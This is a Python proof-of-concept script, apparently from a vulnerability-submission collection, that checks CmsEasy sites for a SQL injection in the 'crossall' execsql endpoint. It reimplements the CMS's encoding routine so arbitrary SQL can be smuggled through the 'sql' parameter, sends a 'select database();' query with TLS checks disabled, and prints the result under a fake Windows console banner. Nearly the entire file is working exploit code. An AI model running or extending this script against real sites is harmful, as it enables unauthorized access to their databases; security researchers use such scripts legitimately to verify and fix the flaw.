#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import base64
import requests
import urllib3
import sys
import json
import random
import re
import hashlib
import string
import urllib.parse

urllib3.disable_warnings()

chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-=+"

def lock_string(txt, key='sql'):
    nh = 1
    ch = chars[nh]
    md_key = hashlib.md5((key + ch).encode()).hexdigest()
    md_key = md_key[nh % 8: nh % 8 + 8]
    txt = base64.b64encode(txt.encode()).decode()
    tmp = ''
    i, j, k = 0, 0, 0
    for i in range(len(txt)):
        if k == len(md_key):
            k = 0
        j = (nh + chars.index(txt[i]) + ord(md_key[k])) % 64
        tmp += chars[j]
        k += 1
        #print(i, j, k, chars[j], ch, md_key)
    return urllib.parse.quote(ch + tmp)

def verify(site):
    payload = "select database();"
    payload_encode = lock_string(payload)
    burp0_url = site + "/?case=crossall&act=execsql&sql=" + payload_encode
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept-Encoding": "gzip"}
    r = requests.get(burp0_url, headers=burp0_headers, verify=False)
    if "database()" in r.text:
        return r.text
    else:
        return ""


if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 CmsEasy-crossall_act-sqli.py ",target)
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，获取当前数据库名称为：", info)
    else:
        print("[-]漏洞不存在")
